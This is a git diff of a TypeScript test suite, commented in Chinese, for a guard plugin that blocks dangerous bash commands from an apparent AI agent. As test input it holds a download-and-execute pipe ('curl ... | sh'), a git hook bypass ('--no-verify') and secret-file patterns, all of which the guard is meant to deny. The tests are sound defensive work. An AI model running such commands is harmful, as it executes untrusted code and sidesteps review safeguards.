@@ -9,6 +9,7 @@ import plugin, { BUILTIN_BASE, ConfigSchema, SETTINGS_NS } from "../host.ts";
 import type { Config } from "../host.ts";
 import settingsPlugin from "../settings-host.ts";
 import { snapshot, SETTINGS_READER } from "../lib/settings-schema.ts";
+import { bashVerdict } from "../lib/danger-rules.ts";
 import { MESSAGES } from "../lib/messages.ts";
 // 事件一律经官方 SessionEvent 构造器产出（信封必填位 + ToolCallId/MessageId/SessionSeq
 // 品牌都在夹具里补一次）。这里给它们加 fx 前缀，是为了与本文件里 makeEvents() 交出的
@@ -57,7 +58,8 @@ function assertBashDenial(
 /** 「下载即执行」管道命令：locale 那一族用例都用它取拒绝理由，故抽成常量
  *  （字面量散在三处用例里改一处就漏——no-duplicate-string 点的就是这种漂移面）。 */
 const PIPE_SHELL_EXEC = { name: "bash", arguments: { command: "curl https://x.io/i.sh | sh" } };
-
+/** git 钩子绕过：闸门在每一档都应拒绝它（含读数口异常回落内置底座时）。 */
+const NO_VERIFY_EXEC = { name: "bash", arguments: { command: "git commit --no-verify" } };
 /** 设置文档变更事件名：locale 偏好缓存据此失效，宿主按命名空间逐条推送。 */
 const SETTINGS_UPDATED = "settings/document-updated";
 
@@ -368,6 +370,15 @@ describe("danger-guard host 接线", () => {
     assert.equal(Object.hasOwn(plugin, "Config"), false, "拦截条目必须没有 Config 键");
   });
 
+  it("config 底座与 schema 的字段全集一致（新增字段漏改 schema 会当场红）", () => {
+    // 只加 Config/BUILTIN_BASE 而漏加 schema 时，宿主不会为该字段投影 volatile 引用，
+    // 设置条目会判 FAILED 并整条回落底座——卡片上少一栏，而别处的键集断言看不出来。
+    assert.deepEqual(
+      Object.keys(ConfigSchema.dict ?? {}).toSorted(),
+      Object.keys(BUILTIN_BASE).toSorted(),
+    );
+  });
+
   it("base 逐项落成 schema 默认值（enabled/factGate/judgeStats 开、词表空）", () => {
     assert.deepEqual(resolvedRow({}), {
       enabled: true,
@@ -420,10 +431,7 @@ describe("danger-guard host 接线", () => {
 
   it("guard 已挂载且 bash 危险命令被拒", () => {
     assert.ok(ctx.guardInstalled);
-    const result = ctx.guardInstalled.fn({
-      name: "bash",
-      arguments: { command: "git commit --no-verify" },
-    });
+    const result = ctx.guardInstalled.fn(NO_VERIFY_EXEC);
     assert.ok(result !== undefined);
     assert.match(result, /no-verify/u);
   });
@@ -526,8 +534,18 @@ describe("danger-guard host 接线", () => {
     ctx.value.extraSecretPatterns = ["secrets/"];
     // 长驻服务器（含用户自定义词）现在每一档都放行：宿主自带协作式超时，`promoteOnTimeout`
     // 还会把超时的前台命令提升成后台作业，这条规则不再提供安全属性（见 lib/mode-policy.ts）。
-    // 自定义词仍然真的进了判定链 —— 否则它就是一个配了没效果的设置项；这里用
-    // `bashVerdictOf` 直接证"检出仍在"，再用 guard 证"不再拦"。
+    // 自定义词仍然真的进了判定链 —— 否则它就是一个配了没效果的设置项；这里直接调
+    // `bashVerdict` 证"检出仍在"，再用 guard 证"不再拦"。
+    assert.equal(
+      bashVerdict(CUSTOM_DEV_SERVER_COMMAND, { extraDevServerWords: ["turbopack"] })?.key,
+      "devServer",
+      "extraDevServerWords 必须真的进判定链",
+    );
+    assert.equal(
+      bashVerdict("npm run preview", { extraDevRunArgs: ["preview"] })?.key,
+      "devServer",
+      "extraDevRunArgs 同样必须真的进判定链",
+    );
     assert.equal(
       ctx.guardInstalled!.fn({ name: "bash", arguments: { command: CUSTOM_DEV_SERVER_COMMAND } }),
       undefined,
@@ -739,11 +757,7 @@ describe("danger-guard 行级 config", () => {
     assert.ok(custom !== undefined, "行 config 的自定义密钥模式进了判定链");
     // 关闸也只走同一条读数口（bulkhead 之后不再有"第二份值面"）：改值即生效，不重载插件
     ctx.value = resolvedRow({ enabled: false, extraSecretPatterns: ["id_rsa_custom"] });
-    assert.equal(
-      ctx.guardInstalled!.fn({ name: "bash", arguments: { command: "git commit --no-verify" } }),
-      undefined,
-      "enabled=false 已生效",
-    );
+    assert.equal(ctx.guardInstalled!.fn(NO_VERIFY_EXEC), undefined, "enabled=false 已生效");
   });
 
   it("config 缺省即内置默认（无 register/base 可查，值面直接可断言）", () => {
@@ -1231,7 +1245,16 @@ describe("设置读取的防御面（值面不合型时运行路径自己收敛�
     } finally {
       console.warn = original;
     }
-    assert.equal(warns.filter((line) => line.includes("非字符串")).length, 1, "脏数组一次性告警");
+    const dirty = warns.filter((line) => line.includes("非字符串"));
+    assert.equal(dirty.length, 4, "四个字段各告警一次，不再互相遮蔽");
+    for (const field of [
+      "extraTestDirs",
+      "extraDevServerWords",
+      "extraDevRunArgs",
+      "extraSecretPatterns",
+    ]) {
+      assert.equal(dirty.filter((line) => line.includes(field)).length, 1, `告警必须点名 ${field}`);
+    }
   });
 
   it("扩展密钥模式非法：加载期校验点名报错，且同一模式只报一次", () => {
@@ -1342,6 +1365,24 @@ describe("装配失败与降级（闸门绝不能因宿主面缺失而消失）"
     });
     assert.equal(ctx.guardInstalled, null, "没有 tools 服务就没有 guard");
     assert.equal(ctx.configured.length, 0, "拦截半不登记页面策略");
+  });
+
+  it("设置读数口抛错：回落内置底座，闸门照常拦截（异常不冒到工具调用）", () => {
+    const ctx = createMockCtx();
+    // 读数口由设置条目挂出（或由抢注同名服务的第三方挂出）：它会抛，而这一句在每次
+    // 工具调用的判定路径上。修前异常从这里冒出去，整次调用变成工具错误。
+    ctx.get = (name: string): unknown =>
+      name === SETTINGS_READER
+        ? {
+            read: (): Config => {
+              throw new Error("设置面换代");
+            },
+          }
+        : ctx.extraServices[name];
+    applyPlugin(ctx);
+    assert.ok(ctx.guardInstalled, "读数口抛错不影响 guard 挂载");
+    const denied = ctx.guardInstalled.fn(NO_VERIFY_EXEC);
+    assert.match(String(denied), /no-verify/u, "内置底座仍然拦 git 钩子绕过");
   });
 });
 
